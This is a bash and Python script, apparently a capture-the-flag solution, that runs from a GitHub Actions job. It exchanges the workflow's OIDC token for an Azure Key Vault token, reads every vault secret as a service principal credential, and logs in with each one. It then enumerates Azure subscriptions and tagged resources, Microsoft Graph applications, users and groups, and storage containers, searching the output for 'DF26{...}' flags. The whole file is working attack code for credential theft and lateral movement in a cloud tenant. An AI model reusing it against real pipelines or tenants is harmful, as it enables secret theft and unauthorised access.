#!/usr/bin/env bash
set -u
: "${AZURE_CLIENT_ID:=72ff278a-9e71-43ec-bac4-2ca303f8e462}"
: "${AZURE_TENANT_ID:=3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d client_id="${AZURE_CLIENT_ID}" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
export VT
python3 - <<'PY'
import os,json,urllib.request,urllib.parse,re
VT=os.environ["VT"]; TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
V="https://kv-tbl-prod-x3euoz.vault.azure.net"
def vg(u): return json.load(urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":"Bearer "+VT}),timeout=25))
sps=[]
for s in vg(V+"/secrets?api-version=7.4")["value"]:
    try:
        j=json.loads(vg(s["id"]+"?api-version=7.4")["value"]); sps.append((s["id"].rsplit("/",1)[-1],j["appId"],j["clientSecret"]))
    except: pass
def tok(c,x,sc):
    d=urllib.parse.urlencode({"client_id":c,"client_secret":x,"grant_type":"client_credentials","scope":sc}).encode()
    try: return json.load(urllib.request.urlopen(f"https://login.microsoftonline.com/{TID}/oauth2/v2.0/token",d,timeout=20)).get("access_token")
    except: return None
def g(u,t):
    try: return urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":"Bearer "+t}),timeout=25).read().decode()
    except Exception as e:
        try: return e.read().decode()[:300]
        except: return str(e)
def hit(tag,s):
    for m in set(re.findall(r'DF26\{[^}]*\}',s)): print("  !!!FLAG",tag,":"," ".join(m))
for name,cid,sec in sps:
    print("===",name,cid)
    at=tok(cid,sec,"https://management.azure.com/.default")
    if at:
        subs=g("https://management.azure.com/subscriptions?api-version=2022-12-01",at); hit("subs",subs)
        try: sids=[s["subscriptionId"] for s in json.loads(subs).get("value",[])]
        except: sids=[]
        print("  subs:",sids)
        for sid in sids:
            r=g(f"https://management.azure.com/subscriptions/{sid}/resources?api-version=2021-04-01&$expand=tags",at); hit("res",r)
            try:
                for x in json.loads(r).get("value",[]):
                    if x.get("tags"): print("   ",x.get("type"),x.get("name"),x.get("tags"))
            except: pass
    gt=tok(cid,sec,"https://graph.microsoft.com/.default")
    if gt:
        for ep in ["applications?$select=displayName,notes,appId,tags","users?$select=displayName,userPrincipalName,jobTitle","groups?$select=displayName,description"]:
            hit("graph "+ep.split("?")[0], g("https://graph.microsoft.com/v1.0/"+ep,gt))
    st=tok(cid,sec,"https://storage.azure.com/.default")
    if st:
        for a in ["sttblbackupprodx3euoz","sttblarchiveprodx3euoz"]:
            lc=g(f"https://{a}.blob.core.windows.net/?comp=list&include=metadata",st); print("  stor",a,lc[:140]); hit("stor",lc)
print("== enum done ==")
PY
